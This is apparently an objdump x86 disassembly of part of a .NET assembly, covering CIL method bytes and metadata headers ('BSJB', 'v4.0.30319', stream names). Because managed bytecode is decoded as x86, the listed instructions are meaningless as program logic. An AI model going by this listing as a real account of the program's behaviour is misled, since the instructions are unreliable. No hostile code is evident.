  405743:	08 6f ee             	or     %ch,-0x12(%edi)
  405746:	00 00                	add    %al,(%eax)
  405748:	0a 07                	or     (%edi),%al
  40574a:	28 4a 00             	sub    %cl,0x0(%edx)
  40574d:	00 0a                	add    %cl,(%edx)
  40574f:	28 58 00             	sub    %bl,0x0(%eax)
  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	24 27                	and    $0x27,%al
  405a26:	00 00                	add    %al,(%eax)
  405a28:	23 53 74             	and    0x74(%ebx),%edx
  405a2b:	72 69                	jb     0x405a96
  405a2d:	6e                   	outsb  %ds:(%esi),(%dx)
  405a2e:	67 73 00             	addr16 jae 0x405a31
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 4c 45 00          	add    %cl,0x0(%ebp,%eax,2)
  405a37:	00 34 28             	add    %dh,(%eax,%ebp,1)
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 80 6d 00 00 10    	add    %al,0x1000006d(%eax)
  405a45:	00 00                	add    %al,(%eax)
  405a47:	00 23                	add    %ah,(%ebx)
  405a49:	47                   	inc    %edi
  405a4a:	55                   	push   %ebp
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 90 6d 00 00 40    	add    %dl,0x4000006d(%eax)
  405a55:	09 00                	or     %eax,(%eax)
  405a57:	00 23                	add    %ah,(%ebx)
  405a59:	42                   	inc    %edx
  405a5a:	6c                   	insb   (%dx),%es:(%edi)
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	c2 24 01             	ret    $0x124
  405add:	00 00                	add    %al,(%eax)
  405adf:	00 00                	add    %al,(%eax)
  405ae1:	00 06                	add    %al,(%esi)
  405ae3:	00 4a 21             	add    %cl,0x21(%edx)
  405ae6:	88 18                	mov    %bl,(%eax)
  405ae8:	0a 00                	or     (%eax),%al
  405aea:	4c                   	dec    %esp
  405aeb:	00 29                	add    %ch,(%ecx)
  405aed:	1f                   	pop    %ds
  405aee:	0a 00                	or     (%eax),%al
  405af0:	77 21                	ja     0x405b13
  405af2:	a8 20                	test   $0x20,%al
  405af4:	0a 00                	or     (%eax),%al
  405af6:	1f                   	pop    %ds
  405af7:	18 b8 26 06 00 6e    	sbb    %bh,0x6e000626(%eax)
  405afd:	1d 56 13 06 00       	sbb    $0x61356,%eax
  405b02:	c2 0f 29             	ret    $0x290f
  405b05:	1f                   	pop    %ds
  405b06:	0a 00                	or     (%eax),%al
  405b08:	6f                   	outsl  %ds:(%esi),(%dx)
  405b09:	19 29                	sbb    %ebp,(%ecx)
  405b0b:	1f                   	pop    %ds
  405b0c:	0a 00                	or     (%eax),%al
  405b0e:	71 20                	jno    0x405b30
  405b10:	b8 26 06 00 c4       	mov    $0xc4000626,%eax
  405b15:	21 88 18 0e 00 d3    	and    %ecx,-0x2cfff1e8(%eax)
  405b1b:	1a 92 13 0e 00 18    	sbb    0x18000e13(%edx),%dl
  405b21:	21 92 13 06 00 1a    	and    %edx,0x1a000613(%edx)
  405b27:	25 56 13 06 00       	and    $0x61356,%eax
  405b2c:	cd 1c                	int    $0x1c
  405b2e:	4c                   	dec    %esp
  405b2f:	23 06                	and    (%esi),%eax
  405b31:	00 ef                	add    %ch,%bh
  405b33:	18 88 18 0a 00 b2    	sbb    %cl,-0x4dfff5e8(%eax)
  405b39:	1f                   	pop    %ds
  405b3a:	2b 00                	sub    (%eax),%eax
  405b3c:	06                   	push   %es
  405b3d:	00 24 00             	add    %ah,(%eax,%eax,1)
  405b40:	8d 0a                	lea    (%edx),%ecx
  405b42:	12 00                	adc    (%eax),%al
  405b44:	19 00                	sbb    %eax,(%eax)
  405b46:	c1 1e 12             	rcrl   $0x12,(%esi)
  405b49:	00 01                	add    %al,(%ecx)
  405b4b:	00 88 18 12 00 f8    	add    %cl,-0x7ffede8(%eax)
  405b51:	0f c1 1e             	xadd   %ebx,(%esi)
  405b54:	06                   	push   %es
  405b55:	00 40 0f             	add    %al,0xf(%eax)
  405b58:	88 18                	mov    %bl,(%eax)
  405b5a:	06                   	push   %es
  405b5b:	00 85 13 4c 23 06    	add    %al,0x6234c13(%ebp)
  405b61:	00 bb 1d 2b 20 06    	add    %bh,0x6202b1d(%ebx)
  405b67:	00 73 0d             	add    %dh,0xd(%ebx)
  405b6a:	2b 20                	sub    (%eax),%esp
  405b6c:	06                   	push   %es
  405b6d:	00 47 18             	add    %al,0x18(%edi)
  405b70:	a8 05                	test   $0x5,%al
  405b72:	06                   	push   %es
  405b73:	00 05 11 c1 1e 06    	add    %al,0x61ec111
  405b79:	00 72 11             	add    %dh,0x11(%edx)
  405b7c:	c1 1e 06             	rcrl   $0x6,(%esi)
  405b7f:	00 22                	add    %ah,(%edx)
  405b81:	10 71 1e             	adc    %dh,0x1e(%ecx)
  405b84:	6f                   	outsl  %ds:(%esi),(%dx)
  405b85:	00 e1                	add    %ah,%cl
  405b87:	1e                   	push   %ds
  405b88:	00 00                	add    %al,(%eax)
  405b8a:	06                   	push   %es
  405b8b:	00 4a 10             	add    %cl,0x10(%edx)
  405b8e:	05 1a 06 00 d1       	add    $0xd100061a,%eax
  405b93:	10 05 1a 06 00 b2    	adc    %al,0xb200061a
  405b99:	10 05 1a 06 00 59    	adc    %al,0x5900061a
  405b9f:	11 05 1a 06 00 25    	adc    %eax,0x2500061a
  405ba5:	11 05 1a 06 00 3e    	adc    %eax,0x3e00061a
  405bab:	11 05 1a 06 00 61    	adc    %eax,0x6100061a
  405bb1:	10 05 1a 06 00 95    	adc    %al,0x9500061a
  405bb7:	10 05 1a 06 00 7c    	adc    %al,0x7c00061a
  405bbd:	10 a9 13 06 00 36    	adc    %ch,0x36000613(%ecx)
  405bc3:	10 a2 1e 06 00 07    	adc    %ah,0x700061e(%edx)
  405bc9:	10 c1                	adc    %al,%cl
  405bcb:	1e                   	push   %ds
  405bcc:	06                   	push   %es
  405bcd:	00 ee                	add    %ch,%dh
  405bcf:	10 05 1a 06 00 14    	adc    %al,0x1400061a
  405bd5:	0b 56 13             	or     0x13(%esi),%edx
  405bd8:	06                   	push   %es
  405bd9:	00 fd                	add    %bh,%ch
  405bdb:	22 88 18 06 00 4b    	and    0x4b000618(%eax),%cl
  405be1:	22 88 18 06 00 89    	and    -0x76fff9e8(%eax),%cl
  405be7:	13 4c 23 0a          	adc    0xa(%ebx,%eiz,1),%ecx
  405beb:	00 ee                	add    %ch,%dh
  405bed:	25 29 1f 06 00       	and    $0x61f29,%eax
  405bf2:	a2 18 04 26 06       	mov    %al,0x6260418
  405bf7:	00 9b 1c 04 26 06    	add    %bl,0x626041c(%ebx)
  405bfd:	00 37                	add    %dh,(%edi)
  405bff:	13 04 26             	adc    (%esi,%eiz,1),%eax
  405c02:	06                   	push   %es
  405c03:	00 8e 1a 88 18 0a    	add    %cl,0xa18881a(%esi)
  405c09:	00 9e 20 65 21 0a    	add    %bl,0xa216520(%esi)
  405c0f:	00 e2                	add    %ah,%dl
  405c11:	21 65 21             	and    %esp,0x21(%ebp)
  405c14:	0a 00                	or     (%eax),%al
  405c16:	0c 17                	or     $0x17,%al
  405c18:	65 21 0a             	and    %ecx,%gs:(%edx)
  405c1b:	00 38                	add    %bh,(%eax)
  405c1d:	26 a8 20             	es test $0x20,%al
  405c20:	0a 00                	or     (%eax),%al
  405c22:	5f                   	pop    %edi
  405c23:	0f a8                	push   %gs
  405c25:	20 0a                	and    %cl,(%edx)
  405c27:	00 4a 0f             	add    %cl,0xf(%edx)
  405c2a:	a8 20                	test   $0x20,%al
  405c2c:	06                   	push   %es
  405c2d:	00 18                	add    %bl,(%eax)
  405c2f:	14 88                	adc    $0x88,%al
  405c31:	18 06                	sbb    %al,(%esi)
  405c33:	00 62 1c             	add    %ah,0x1c(%edx)
  405c36:	88 18                	mov    %bl,(%eax)
  405c38:	06                   	push   %es
  405c39:	00 d7                	add    %dl,%bh
  405c3b:	18 88 18 0a 00 1e    	sbb    %cl,0x1e000a18(%eax)
  405c41:	20 65 21             	and    %ah,0x21(%ebp)
  405c44:	0a 00                	or     (%eax),%al
  405c46:	d8 1f                	fcomps (%edi)
  405c48:	65 21 06             	and    %eax,%gs:(%esi)
  405c4b:	00 3e                	add    %bh,(%esi)
  405c4d:	20 88 18 06 00 7f    	and    %cl,0x7f000618(%eax)
  405c53:	0d 88 18 0a 00       	or     $0xa1888,%eax
  405c58:	11 18                	adc    %ebx,(%eax)
  405c5a:	a8 20                	test   $0x20,%al
  405c5c:	0a 00                	or     (%eax),%al
  405c5e:	2d 16 b8 26 0a       	sub    $0xa26b816,%eax
  405c63:	00 b2 22 65 21 0a    	add    %dh,0xa216522(%edx)
  405c69:	00 17                	add    %dl,(%edi)
  405c6b:	1a 29                	sbb    (%ecx),%ch
  405c6d:	1f                   	pop    %ds
  405c6e:	0a 00                	or     (%eax),%al
  405c70:	fc                   	cld
  405c71:	1f                   	pop    %ds
  405c72:	e6 19                	out    %al,$0x19
  405c74:	06                   	push   %es
  405c75:	00 b2 11 88 18 06    	add    %dh,0x6188811(%edx)
  405c7b:	00 51 16             	add    %dl,0x16(%ecx)
  405c7e:	56                   	push   %esi
  405c7f:	13 06                	adc    (%esi),%eax
  405c81:	00 1f                	add    %bl,(%edi)
  405c83:	16                   	push   %ss
  405c84:	88 18                	mov    %bl,(%eax)
  405c86:	0a 00                	or     (%eax),%al
  405c88:	8a 15 88 18 0a 00    	mov    0xa1888,%dl
  405c8e:	2c 0f                	sub    $0xf,%al
  405c90:	88 18                	mov    %bl,(%eax)
  405c92:	06                   	push   %es
  405c93:	00 a6 1d 88 18 06    	add    %ah,0x618881d(%esi)
  405c99:	00 e4                	add    %ah,%ah
  405c9b:	22 56 13             	and    0x13(%esi),%dl
  405c9e:	06                   	push   %es
  405c9f:	00 41 18             	add    %al,0x18(%ecx)
  405ca2:	a8 05                	test   $0x5,%al
  405ca4:	06                   	push   %es
  405ca5:	00 26                	add    %ah,(%esi)
  405ca7:	1e                   	push   %ds
  405ca8:	56                   	push   %esi
  405ca9:	13 0a                	adc    (%edx),%ecx
  405cab:	00 44 0d a8          	add    %al,-0x58(%ebp,%ecx,1)
  405caf:	20 06                	and    %al,(%esi)
  405cb1:	00 36                	add    %dh,(%esi)
  405cb3:	01 88 18 06 00 e2    	add    %ecx,-0x1dfff9e8(%eax)
  405cb9:	1a a8 05 0a 00 96    	sbb    -0x69fff5fb(%eax),%ch
  405cbf:	20 71 1e             	and    %dh,0x1e(%ecx)
  405cc2:	0a 00                	or     (%eax),%al
  405cc4:	24 1b                	and    $0x1b,%al
  405cc6:	71 1e                	jno    0x405ce6
  405cc8:	06                   	push   %es
  405cc9:	00 f8                	add    %bh,%al
  405ccb:	25 2b 00 06 00       	and    $0x6002b,%eax
  405cd0:	88 1d a8 05 06 00    	mov    %bl,0x605a8
  405cd6:	0f 15 a8 05 0a 00 2a 	unpckhps 0x2a000a05(%eax),%xmm5
  405cdd:	0e                   	push   %cs
  405cde:	71 1e                	jno    0x405cfe
  405ce0:	06                   	push   %es
  405ce1:	00 f5                	add    %dh,%ch
  405ce3:	1a a8 05 0a 00 48    	sbb    0x48000a05(%eax),%ch
  405ce9:	0e                   	push   %cs
